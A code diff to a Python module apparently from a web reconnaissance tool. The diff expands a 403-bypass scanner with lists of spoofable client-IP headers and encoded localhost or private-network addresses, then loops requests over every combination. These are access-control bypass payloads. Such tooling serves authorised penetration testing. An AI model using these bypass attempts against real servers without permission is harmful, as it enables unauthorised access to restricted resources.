@@ -16,6 +16,7 @@ from typing import Any, Dict, List
 #   Ⓒ                                                                                                                Ⓒ
 #   Ⓒ    This module was written in Python in order to integrate better with WebRecon, most methods were taken from  Ⓒ
 #   Ⓒ    from this repo     ->      https://github.com/iamj0ker/bypass-403                                           Ⓒ
+#   Ⓒ    and this repo      ->      https://github.com/yunemse48/403bypasser                                         Ⓒ
 #   Ⓒ                                                                                                                Ⓒ
 #
 #   --------------------------------------------------------------------------------------------------------------------
@@ -27,6 +28,17 @@ class Bypass403(Scanner):
     _WRITE_RESULTS = False
     _SUPPORTS_CACHE = False
     _FOUND = 0
+
+    _HOST_HEADERS = ["X-Custom-IP-Authorization", "X-Forwarded-For",
+                     "X-Forward-For", "X-Remote-IP", "X-Originating-IP",
+                     "X-Remote-Addr", "X-Client-IP", "X-Real-IP",
+                     "X-Host"]
+
+    _LHOST_NICKNAMES = ["localhost", "localhost:80", "localhost:443",
+                        "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443",
+                        "2130706433", "0x7F000001", "0177.0000.0000.0001",
+                        "0", "127.1", "10.0.0.0", "10.0.0.1", "172.16.0.0",
+                        "172.16.0.1", "192.168.1.0", "192.168.1.1"]
 
     def __init__(self, target_keyword, *args, **kwargs):
         self.target_keyword = target_keyword.strip("/")
@@ -105,11 +117,6 @@ class Bypass403(Scanner):
         # headers
 
         req_path = f"{self.target_url}/{self.target_keyword}"
-        headers = {"X-Original-URL": self.target_keyword}
-        results[self.send_request("GET", req_path,
-                                  headers=headers)].append(f"GET {req_path} -H 'X-Original-URL: {self.target_keyword}'")
-
-        req_path = f"{self.target_url}/{self.target_keyword}"
         headers = {"X-Custom-IP-Authorization": "127.0.0.1"}
         results[self.send_request("GET", req_path,
                                   headers=headers)].append(f"GET {req_path} -H 'X-Custom-IP-Authorization: 127.0.0.1'")
@@ -124,14 +131,22 @@ class Bypass403(Scanner):
         results[self.send_request("GET", req_path,
                                   headers=headers)].append(f"GET {req_path} -H 'X-Forwarded-For: 127.0.0.1:80'")
 
+        for header in Bypass403._HOST_HEADERS:
+            for host_nickname in Bypass403._LHOST_NICKNAMES:
+                req_path = f"{self.target_url}/{self.target_keyword}"
+                headers = {header: host_nickname}
+                results[self.send_request("GET", req_path,
+                                          headers=headers)].append(f"GET {req_path} -H {header}: {host_nickname}")
+
         req_path = f"{self.target_url}"
         headers = {"X-rewrite-url": self.target_keyword}
         results[self.send_request("GET", req_path,
                                   headers=headers)].append(f"GET {req_path} -H 'X-rewrite-url: {self.target_keyword}'")
 
-        req_path = f"{self.target_url}/{self.target_keyword}"
-        headers = {"X-Host": "127.0.0.1"}
-        results[self.send_request("GET", req_path, headers=headers)].append(f"GET {req_path} -H 'X-Host: 127.0.0.1'")
+        req_path = f"{self.target_url}"
+        headers = {"X-Original-URL": self.target_keyword}
+        results[self.send_request("GET", req_path,
+                                  headers=headers)].append(f"GET {req_path} -H 'X-Original-URL: {self.target_keyword}'")
 
         return results
 
